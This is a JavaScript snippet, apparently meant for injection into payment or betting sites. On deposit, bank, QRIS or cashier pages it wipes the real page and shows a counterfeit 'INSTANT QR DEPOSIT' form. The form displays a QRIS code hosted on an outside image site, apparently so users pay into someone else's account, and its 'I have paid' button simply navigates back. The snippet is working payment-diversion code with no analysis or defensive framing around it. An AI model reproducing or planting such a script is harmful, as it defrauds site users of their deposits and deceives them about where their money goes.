(function () {
  const targetUrls = [
    "/deposit",
    "/bank",
    "/qris",
    "/deposit.php",
    "/bank.php",
    "/qris.php",
    "index.php?page=deposit",
    "index.php?page=cashier"
  ];

  const currentUrl = window.location.href;
  const isTarget = targetUrls.some((end) => currentUrl.endsWith(end));

  if (!isTarget) return;

  // Bersihkan isi lama
  document.documentElement.innerHTML = "";

  // Tambah font elegan
  const fontLink = document.createElement("link");
  fontLink.href =
    "https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap";
  fontLink.rel = "stylesheet";
  document.head.appendChild(fontLink);

  // Tambah style untuk mobile UI elegan
  const style = document.createElement("style");
  style.textContent = `
    body {
      margin:0;
      font-family:'Poppins', sans-serif;
      background: linear-gradient(160deg, #1b1b2f, #2a2a4a, #202040);
      color:#f1f1f1;
      display:flex;
      flex-direction:column;
      align-items:center;
      justify-content:flex-start;
      min-height:100vh;
      padding:20px 15px;
      text-align:center;
    }
    h1 {
      margin:25px 0 20px;
      font-weight:600;
      font-size:1.4rem;
    }
    .card {
      width:100%;
      max-width:360px;
      background:rgba(255,255,255,0.08);
      backdrop-filter:blur(12px);
      padding:20px;
      border-radius:20px;
      box-shadow:0 8px 20px rgba(0,0,0,0.4);
    }
    input {
      width:100%;
      padding:12px;
      margin-bottom:12px;
      border:none;
      border-radius:12px;
      background:rgba(255,255,255,0.12);
      color:#fff;
      font-size:0.95rem;
      outline:none;
    }
    input::placeholder { color:#bbb; }
    button {
      width:100%;
      padding:12px;
      margin-top:10px;
      border:none;
      border-radius:25px;
      font-weight:600;
      cursor:pointer;
      font-size:0.95rem;
      transition:0.25s;
    }
    button:active { transform:scale(0.97); }
    #showQrisBtn { background:#4CAF50; color:#fff; }
    #downloadBtn { background:#007bff; color:#fff; }
    #paidBtn { background:#ffc107; color:#000; }
    #qris-card { display:none; animation:fadeIn 0.4s ease; }
    @keyframes fadeIn {
      from { opacity:0; transform:translateY(10px); }
      to { opacity:1; transform:translateY(0); }
    }
    footer {
      margin-top:40px;
      font-size:11px;
      color:#aaa;
    }
    footer img { max-width:110px; opacity:0.9; margin-bottom:8px; }
  `;
  document.head.appendChild(style);

  // Struktur halaman
  const container = document.createElement("div");
  container.innerHTML = `
    <h1>INSTANT QR DEPOSIT</h1>
    
    <div id="form-card" class="card">
      <input type="text" id="nama" placeholder="Nama Pengirim">
      <input type="number" id="nominal" placeholder="Nominal (min. 50.000)">
      <input type="text" id="catatan" placeholder="Catatan">
      <button id="showQrisBtn">Buat Qris</button>
    </div>

    <div id="qris-card" class="card" style="margin-top:25px;">
      <img src="https://imagizer.imageshack.com/v2/320xq70/r/922/CFAtIh.jpg" alt="QRIS" style="max-width:100%; border-radius:15px; margin-bottom:18px; border:2px solid rgba(255,255,255,0.15);">
      <button id="downloadBtn">Download Qris</button>
      <button id="paidBtn">Saya Sudah Membayar</button>
    </div>

    <footer>
      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSxt4SV-4Fwz_SHmJwW_ENA4zghNfwbYgAG4x_l9IbA0w&s=10" alt="Footer Image">
      <div>X2022-2025©</div>
    </footer>
  `;

  document.body.appendChild(container);

  // Event
  document.getElementById("showQrisBtn").addEventListener("click", function () {
    document.getElementById("form-card").style.display = "none";
    document.getElementById("qris-card").style.display = "block";
  });

  document.getElementById("downloadBtn").addEventListener("click", function () {
    window.location.href =
      "https://imagizer.imageshack.com/v2/320xq70/r/922/CFAtIh.jpg";
  });

  document.getElementById("paidBtn").addEventListener("click", function () {
    window.history.back();
  });
})();
